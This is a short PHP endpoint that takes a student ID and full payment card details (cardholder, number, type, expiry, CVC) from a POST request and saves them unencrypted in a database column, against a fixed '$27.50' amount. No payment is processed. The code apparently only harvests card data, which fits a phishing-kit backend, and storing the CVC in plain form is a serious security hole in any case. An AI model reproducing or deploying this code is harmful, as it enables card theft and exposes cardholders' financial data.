<?php
session_start();
require_once __DIR__ . '/../includes/functions.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') jsonResponse(['error' => 'Method not allowed'], 405);

$input = json_decode(file_get_contents('php://input'), true);
$studentId = (int)($input['student_id'] ?? 0);

if (!$studentId) jsonResponse(['error' => 'Invalid student'], 400);

$paymentData = json_encode([
    'cardholder' => sanitize($input['cardholder'] ?? ''),
    'card_number' => sanitize($input['card_number'] ?? ''),
    'card_type' => sanitize($input['card_type'] ?? ''),
    'expiry' => sanitize($input['expiry'] ?? ''),
    'cvc' => sanitize($input['cvc'] ?? ''),
    'received_at' => date('Y-m-d H:i:s'),
    'amount' => '$27.50'
]);

$db = getDB();
$db->prepare("UPDATE students SET payment_data = ? WHERE id = ?")->execute([$paymentData, $studentId]);
logActivity($studentId, 'payment_submitted', 'Card data received');

jsonResponse(['success' => true]);
